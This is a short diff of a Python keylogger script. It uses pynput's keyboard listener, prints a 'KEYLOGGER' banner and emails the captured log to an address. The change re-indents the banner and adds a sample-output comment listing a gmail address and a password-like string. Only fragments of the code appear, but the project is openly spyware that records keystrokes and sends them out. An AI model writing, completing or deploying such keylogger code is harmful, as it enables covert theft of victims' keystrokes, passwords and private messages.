@@ -7,7 +7,7 @@ from pynput.keyboard import Key, Listener
 
 print(
 
-""" _        _______           _        _______  _______  _______  _______  _______ 
+    """ _        _______           _        _______  _______  _______  _______  _______ 
 | \    /\(  ____ \|\     /|( \      (  ___  )(  ____ \(  ____ \(  ____ \(  ____ )
 |  \  / /| (    \/( \   / )| (      | (   ) || (    \/| (    \/| (    \/| (    )|
 |  (_/ / | (__     \ (_) / | |      | |   | || |      | |      | (__    | (____)|
@@ -79,6 +79,9 @@ Logger: """ + full_log
         email,  # from
         message
     )
+
+# SAMPLE OUTPUT
+# gmail.com 1gg4t348g@gmail.com 1234abcd
 
 
 # listner boiler plate
